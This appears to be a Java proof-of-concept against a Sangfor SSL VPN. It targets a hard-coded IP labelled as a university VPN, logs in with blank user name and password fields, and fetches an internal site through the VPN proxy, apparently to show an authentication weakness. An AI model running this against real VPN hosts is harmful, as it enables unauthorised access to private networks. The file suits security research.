package me.flanker.poc.sangforvpn;

import java.io.IOException;

import me.flanker.tools.WrappedHttpClient;

import org.apache.http.client.ClientProtocolException;


public class SangforVpnPoc {
		
	public static void main(String args[]) throws ClientProtocolException, IOException
	{
		final String ZJU_RVPN_HOST = "https://61.175.193.50/";
		String user = "",password = "";
		WrappedHttpClient client = new WrappedHttpClient();
		
		//cookie init
		client.GetContent(ZJU_RVPN_HOST+"/por/login_auth.csp?dev=android-phone&language=zh_CN");
		
		client.cleanPostContent();
		client.AddToPostContent("svpn_name", user);
		client.AddToPostContent("svpn_rand_code", "");
		client.AddToPostContent("svpn_password", password);
		//authenticate
		client.PostContent(ZJU_RVPN_HOST+"/por/login_psw.csp?type=cs&dev=android-phone&dev=android-phone&language=zh_CN");
		
		//fetch content, hooray
		System.out.println(client.GetContent(ZJU_RVPN_HOST+"/web/1/http/0/www.cc98.org/"));
	}
}
